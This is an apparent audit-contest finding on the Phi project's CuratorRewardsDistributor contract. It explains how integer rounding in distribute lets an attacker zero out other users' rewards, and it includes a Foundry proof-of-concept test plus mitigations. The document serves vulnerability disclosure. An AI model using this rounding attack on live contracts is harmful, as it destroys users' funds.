# Vulnerability details

Solidity does not have float number so if you divide a divisor major than the numerator, the operation will round to zero. This is a common problem in smart contracts and in some cases attackers could exploit this rounding issues.

In the context of the Phi system there is a instance where an attacker can make loss of funds to the project and users see the `distribute` function:

```solidity

 function distribute(uint256 credId) external {
      

        for (uint256 i = 0; i < distributeAddresses.length; i++) {
            address user = distributeAddresses[i];

            uint256 userAmounts = credContract.getShareNumber(credId, user);
            uint256 userRewards = (distributeAmount * userAmounts) / totalNum;  <------

            if (userRewards > 0) {
                amounts[i] = userRewards;
                actualDistributeAmount += userRewards;
            }
        }

        balanceOf[credId] -= totalBalance;  

        _msgSender().safeTransferETH(royaltyfee + distributeAmount - actualDistributeAmount);

        //slither-disable-next-line arbitrary-send-eth
        phiRewardsContract.depositBatch{ value: actualDistributeAmount }(
            distributeAddresses, amounts, reasons, "deposit from curator rewards distributor"
        );

        emit RewardsDistributed(
            credId, _msgSender(), royaltyfee + distributeAmount - actualDistributeAmount, distributeAmount, totalBalance
        );
    }


```
[[Link]](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/CuratorRewardsDistributor.sol#L77)

As you can see the ` uint256 userRewards = (distributeAmount * userAmounts) / totalNum; ` can round to zero if the conditions met. If `userRewards ` round to zero then the totalBalance of the crid is deducted(so that means that the rewards for that user that round to zero are gone) see second arrow.

With that being say an attacker just keep calling `distribute` function each time  a little rewards get in the project and the `distributeAmount` will be not enough to not round to zero, And attacker also can deposit rewards in a cred to make round to zero the rewards of other users this could be cost/ benefic in some cases because if the deposit in big enough can make round to zero more users.



## Impact
user may loss his rewards 

## Proof of Concept
Run the next proof of concept in `file: test/CuratorRewardsDistributor.t.sol`

```solidity
 function testDistributeRounding() public {
        uint256 credId = 1;
        uint256 depositAmount = 3;

        // Deposit some ETH to the curatorRewardsDistributor
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

        // Signal creds for different users
        vm.startPrank(user1);
        vm.deal(user1, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
        vm.stopPrank();

        vm.startPrank(user2);
        vm.deal(user2, bondingCurve.getBuyPriceAfterFee(credId, 2, 2));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 2, 2) }(credId, 2, 0);
        vm.stopPrank();

        address attacker = address(123_213);
        vm.deal(attacker, 1 ether);

        // Distribute rewards
        vm.prank(attacker);
        curatorRewardsDistributor.distribute(credId);

        // Check final balances
        uint256 finalUser1Balance = phiRewards.balanceOf(user1);

        console.log(finalUser1Balance);

        assertEq(
            curatorRewardsDistributor.balanceOf(credId),
            0,
            "CuratorRewardsDistributor balance should be 0 after distribution"
        );
    }

```

As we can see in the POC the user are getting zero rewards and also the balanceOf the crid is zero, losing user rewards

## Tools Used

## Recommended Mitigation Steps

Consider make distribute function access control, so the project or the credid owner have total control of the distribution.

Another solution is check for round to zero and if this cases revert, but the project have to implement a minimal amount of share that a user can hold to prevent DoS.
